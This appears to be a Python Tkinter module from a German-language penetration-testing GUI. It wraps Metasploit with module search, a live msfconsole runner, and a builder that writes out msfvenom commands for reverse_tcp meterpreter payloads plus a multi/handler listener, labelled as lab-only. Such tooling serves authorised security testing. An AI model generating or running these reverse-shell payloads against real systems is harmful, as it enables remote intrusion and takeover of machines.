"""Metasploit Modul - Suche, Payload-Builder (nur Anzeige), Live-Konsole.

Vertrag: TITLE + build(parent, ctx) -> tk.Frame.
Nutzt core.theme (COLORS, FONTS) und core.utils defensiv (mit Fallbacks).
Kein Auto-Exploit: Builder zeigt msfvenom-Befehle nur an (+ Kopieren).
"""

from __future__ import annotations

import os
import shutil
import socket
import subprocess
import sys
import threading
import tkinter as tk
from tkinter import scrolledtext, ttk

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from core.theme import COLORS as _COLORS, FONTS as _FONTS  # type: ignore
except Exception:
    _COLORS, _FONTS = {}, {}

try:
    from core.utils import get_interfaces as _get_interfaces  # type: ignore
    from core.utils import install_hint as _install_hint  # type: ignore
    from core.utils import run_cmd as _run_cmd, run_stream as _run_stream  # type: ignore
    from core.utils import which_tool as _which_tool  # type: ignore
except Exception:
    _get_interfaces = _install_hint = _run_cmd = _run_stream = _which_tool = None


def _c(*keys, default):
    if isinstance(_COLORS, dict):
        for k in keys:
            if k in _COLORS:
                return _COLORS[k]
    return default


BG = _c("bg", "BG", default="#0d1117")
PANEL = _c("panel", "BG2", default="#161b22")
ENTRY_BG = _c("entry", default="#0a0e14")
FG = _c("fg", "FG", "text", default="#c9d1d9")
MUTED = _c("muted", "dim", "GRAY", default="#8b949e")
ACCENT = _c("accent", "ACCENT", "neon", default="#00ff41")
WARN = _c("warn", "YELLOW", "amber", default="#ffaa00")
DANGER = _c("danger", "crit", "RED", "red", default="#ff3355")
OK = _c("ok", default="#00ff41")
BORDER = _c("border", "BORDER", default="#30363d")


def _f(*keys, default):
    if isinstance(_FONTS, dict):
        for k in keys:
            if k in _FONTS:
                return _FONTS[k]
    return default


F_TITLE = _f("title", "TITLE", default=("Consolas", 13, "bold"))
F_SUB = _f("subtitle", default=("Consolas", 10, "bold"))
F_NORM = _f("normal", "NORMAL", "mono", "MONO", default=("Consolas", 9))
F_SMALL = _f("small", "SMALL", default=("Consolas", 8))


def which_tool(name):
    if _which_tool is not None:
        try:
            return _which_tool(name)
        except Exception:
            pass
    return shutil.which(name)


def install_hint(name):
    if _install_hint is not None:
        try:
            return _install_hint(name)
        except Exception:
            pass
    return f"sudo apt update && sudo apt install -y {name}"


def run_cmd(cmd, timeout=120):
    if _run_cmd is not None:
        try:
            return _run_cmd(cmd, timeout=timeout)
        except TypeError:
            return _run_cmd(cmd)
        except Exception as e:
            return 1, "", str(e)
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout or "", p.stderr or ""
    except FileNotFoundError:
        return 127, "", f"Befehl nicht gefunden: {cmd[0]} ({install_hint(cmd[0])})"
    except subprocess.TimeoutExpired:
        return 124, "", f"Timeout nach {timeout}s"


def run_stream(cmd, on_line, on_done=None, stop_event=None):
    if _run_stream is not None:
        try:
            return _run_stream(cmd, on_line, on_done=on_done, stop_event=stop_event)
        except TypeError:
            return _run_stream(cmd, on_line)
        except Exception as e:
            on_line(f"[!] run_stream Fehler: {e}")
            if on_done:
                on_done(1)
            return 1
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                text=True, bufsize=1)
    except FileNotFoundError:
        on_line(f"[!] Tool fehlt: {cmd[0]} -> {install_hint(cmd[0])}")
        if on_done:
            on_done(127)
        return 127
    rc = 1
    try:
        for line in proc.stdout:
            on_line(line.rstrip("\n"))
            if stop_event is not None and stop_event.is_set():
                try:
                    proc.terminate()
                except Exception:
                    pass
                break
        try:
            rc = proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            proc.kill()
            rc = proc.wait()
        if stop_event is not None and stop_event.is_set():
            rc = -9
    finally:
        try:
            proc.stdout.close()
        except Exception:
            pass
    if on_done:
        on_done(rc)
    return rc


def _iface_ips(raw):
    """Normalisiert get_interfaces(): akzeptiert list[str] und list[dict]."""
    out = []
    for x in raw or []:
        if isinstance(x, str):
            if x and x not in out:
                out.append(x)
        elif isinstance(x, dict):
            for k in ("ip", "addr", "address"):
                v = x.get(k)
                if v and v not in out:
                    out.append(v)
                    break
    out.sort(key=lambda v: v.startswith("127."))
    return out


def get_interfaces():
    if _get_interfaces is not None:
        try:
            ips = _iface_ips(_get_interfaces())
            if ips:
                return ips
        except Exception:
            pass
    ips = []
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            ip = info[4][0]
            if ip not in ips:
                ips.append(ip)
    except Exception:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        if ip not in ips:
            ips.insert(0, ip)
    except Exception:
        pass
    if not ips:
        ips = ["127.0.0.1"]
    ips.sort(key=lambda x: x.startswith("127."))
    return ips


TITLE = "Metasploit"

PAYLOADS = [
    "linux/x64/meterpreter/reverse_tcp",
    "windows/meterpreter/reverse_tcp",
    "php/meterpreter_reverse_tcp",
]


def build(parent, ctx) -> tk.Frame:
    root = tk.Frame(parent, bg=BG)
    stop_event = threading.Event()

    def lab(prt, text, fg=None, font=None, bg=None):
        return tk.Label(prt, text=text, bg=bg or BG, fg=fg or FG, font=font or F_NORM)

    def btn(prt, text, cmd, fg=None):
        return tk.Button(prt, text=text, command=cmd, bg=PANEL, fg=fg or ACCENT,
                         activebackground=BORDER, activeforeground=ACCENT,
                         relief="groove", bd=1, font=F_NORM)

    def ent(prt, var, width=30):
        return tk.Entry(prt, textvariable=var, width=width, bg=ENTRY_BG, fg=FG, font=F_NORM,
                        insertbackground=ACCENT, relief="flat", highlightthickness=1,
                        highlightbackground=BORDER, highlightcolor=ACCENT)

    def out(prt, height=7):
        return scrolledtext.ScrolledText(prt, height=height, bg=ENTRY_BG, fg=FG, font=F_NORM,
                                         insertbackground=ACCENT, relief="flat",
                                         highlightthickness=1, highlightbackground=BORDER)

    def box(prt, text):
        return tk.LabelFrame(prt, text=text, bg=PANEL, fg=ACCENT, font=F_SUB)

    lab(root, "Metasploit (nur Labor! Kein Auto-Exploit)", fg=ACCENT, font=F_TITLE).pack(
        anchor="w", padx=8, pady=(8, 0))
    lab(root, "Alle Befehle laufen live via msfconsole/msfvenom. Nur eigene Laborsysteme!",
        fg=DANGER).pack(anchor="w", padx=8)

    msf_path = which_tool("msfconsole")
    status = lab(root, "", fg=MUTED, font=F_SMALL)
    status.pack(anchor="w", padx=8)
    if msf_path is None:
        status.config(text=f"[!] msfconsole fehlt -> {install_hint('msfconsole')}", fg=DANGER)
    else:
        status.config(text=f"[OK] msfconsole: {msf_path}", fg=OK)

    def ui(fn, *a, **kw):
        root.after(0, lambda: fn(*a, **kw))

    # ---------- Modul-Suche (run_cmd im Thread) ----------
    box_search = box(root, "Modul-Suche")
    box_search.pack(fill="x", padx=8, pady=4)
    row = tk.Frame(box_search, bg=PANEL)
    row.pack(fill="x", padx=4, pady=4)
    lab(row, "Suchbegriff:", bg=PANEL).pack(side="left")
    search_var = tk.StringVar(value="smb")
    ent(row, search_var).pack(side="left", padx=6)
    txt_search = out(box_search, height=7)
    txt_search.pack(fill="x", padx=4, pady=4)

    def do_search():
        term = search_var.get().strip()
        if not term:
            return
        if which_tool("msfconsole") is None:
            txt_search.delete("1.0", "end")
            txt_search.insert("end", f"[!] msfconsole fehlt -> {install_hint('msfconsole')}\n")
            return
        txt_search.delete("1.0", "end")
        txt_search.insert("end", f"[*] suche '{term}' (live, kann 30-60s dauern) ...\n")
        btn_search.config(state="disabled")

        def worker():
            rc, o, err = run_cmd(["msfconsole", "-q", "-x", f"search {term}; exit"], timeout=180)

            def done():
                txt_search.insert("end", o[-12000:] if o else "")
                if err.strip():
                    txt_search.insert("end", "\n[stderr]\n" + err[-3000:])
                txt_search.insert("end", f"\n[*] Fertig (Exit {rc}).\n")
                txt_search.see("end")
                btn_search.config(state="normal")

            ui(done)

        threading.Thread(target=worker, daemon=True).start()

    btn_search = btn(row, "Suchen", do_search)
    btn_search.pack(side="left")

    # ---------- Befehls-Builder (nur Anzeige + Kopieren) ----------
    box_build = box(root, "Payload-Builder (nur Anzeige + Kopieren)")
    box_build.pack(fill="x", padx=8, pady=4)
    grid = tk.Frame(box_build, bg=PANEL)
    grid.pack(fill="x", padx=4, pady=4)

    ifaces = get_interfaces()
    lhost_var = tk.StringVar(value=ifaces[0] if ifaces else "127.0.0.1")
    lport_var = tk.StringVar(value="4444")
    payload_var = tk.StringVar(value=PAYLOADS[0])

    lab(grid, "LHOST:", bg=PANEL).grid(row=0, column=0, sticky="w")
    ent(grid, lhost_var, width=20).grid(row=0, column=1, padx=4)
    lab(grid, "LPORT:", bg=PANEL).grid(row=0, column=2, sticky="w")
    ent(grid, lport_var, width=10).grid(row=0, column=3, padx=4)
    lab(grid, "Payload:", bg=PANEL).grid(row=1, column=0, sticky="w")
    ttk.Combobox(grid, textvariable=payload_var, values=PAYLOADS, width=42,
                 state="readonly").grid(row=1, column=1, columnspan=3, sticky="ew", padx=4, pady=2)
    lab(grid, f"Erkannte IPs: {', '.join(ifaces[:4])}", fg=MUTED, font=F_SMALL,
        bg=PANEL).grid(row=2, column=0, columnspan=4, sticky="w")

    txt_build = out(box_build, height=5)
    txt_build.pack(fill="x", padx=4, pady=4)

    def fmt_for_payload(payload):
        if payload.startswith("windows"):
            return "exe", "payload.exe"
        if payload.startswith("linux"):
            return "elf", "payload.elf"
        if payload.startswith("php"):
            return "raw", "payload.php"
        return "elf", "payload.bin"

    def refresh_build(*_):
        p = payload_var.get().strip()
        h, port = lhost_var.get().strip(), lport_var.get().strip()
        fmt, outfile = fmt_for_payload(p)
        cmd = f"msfvenom -p {p} LHOST={h} LPORT={port} -f {fmt} -o {outfile}"
        handler = (f"use exploit/multi/handler; set PAYLOAD {p}; "
                   f"set LHOST {h}; set LPORT {port}; run")
        txt_build.delete("1.0", "end")
        txt_build.insert("end", cmd + "\n")
        txt_build.insert("end", f"# Handler in msfconsole: {handler}\n")
        txt_build.insert("end", "# Hinweis: Nur Anzeige - kein Auto-Exploit, nur Labor!\n")

    for v in (lhost_var, lport_var, payload_var):
        v.trace_add("write", refresh_build)
    refresh_build()

    def copy_build():
        root.clipboard_clear()
        root.clipboard_append(txt_build.get("1.0", "end").strip())
        status.config(text="[OK] msfvenom-Befehl kopiert.", fg=OK)

    btn(box_build, "Kopieren", copy_build).pack(anchor="e", padx=4, pady=(0, 4))

    # ---------- Live-Konsole ----------
    box_msf = box(root, "MSF-Konsole (live)")
    box_msf.pack(fill="both", expand=True, padx=8, pady=4)
    row2 = tk.Frame(box_msf, bg=PANEL)
    row2.pack(fill="x", padx=4, pady=4)
    lab(row2, "msf-Befehl:", bg=PANEL).pack(side="left")
    msf_var = tk.StringVar(value="version")
    ent(row2, msf_var, width=45).pack(side="left", padx=6, fill="x", expand=True)
    txt_msf = out(box_msf, height=8)
    txt_msf.pack(fill="both", expand=True, padx=4, pady=4)

    def msf_log(msg):
        txt_msf.insert("end", msg + "\n")
        txt_msf.see("end")

    def run_msf():
        cmd = msf_var.get().strip()
        if not cmd:
            return
        if which_tool("msfconsole") is None:
            ui(msf_log, f"[!] msfconsole fehlt -> {install_hint('msfconsole')}")
            return
        stop_event.clear()
        ui(msf_log, f"$ msfconsole -q -x \"{cmd}; exit\" (live ...)")

        def worker():
            rc = run_stream(["msfconsole", "-q", "-x", f"{cmd}; exit"],
                            on_line=lambda ln: ui(msf_log, ln), stop_event=stop_event)
            ui(msf_log, f"[*] Fertig (Exit {rc})." if rc != -9 else "[*] Abgebrochen.")

        threading.Thread(target=worker, daemon=True).start()

    def stop_msf():
        stop_event.set()
        ui(msf_log, "[*] Stop angefordert ...")

    btn(row2, "Run", run_msf).pack(side="left", padx=2)
    btn(row2, "Stop", stop_msf, fg=DANGER).pack(side="left", padx=2)

    # ---------- Interaktives Terminal (Fallback-Kette) ----------
    def open_terminal():
        cands = [
            (["x-terminal-emulator", "-e", "msfconsole"], "x-terminal-emulator"),
            (["gnome-terminal", "--", "msfconsole"], "gnome-terminal"),
            (["konsole", "-e", "msfconsole"], "konsole"),
            (["xterm", "-e", "msfconsole"], "xterm"),
        ]
        for argv, prog in cands:
            if which_tool(prog):
                try:
                    subprocess.Popen(argv)
                    status.config(text=f"[OK] Terminal geöffnet: {' '.join(argv)}", fg=OK)
                    return
                except Exception as e:
                    status.config(text=f"[!] Terminal-Fehler: {e}", fg=DANGER)
                    return
        status.config(text="[!] Kein Terminal gefunden (x-terminal-emulator/gnome-terminal/xterm).",
                      fg=DANGER)

    btn(root, "msfconsole interaktiv im Terminal öffnen", open_terminal).pack(
        anchor="w", padx=8, pady=(0, 8))
    return root
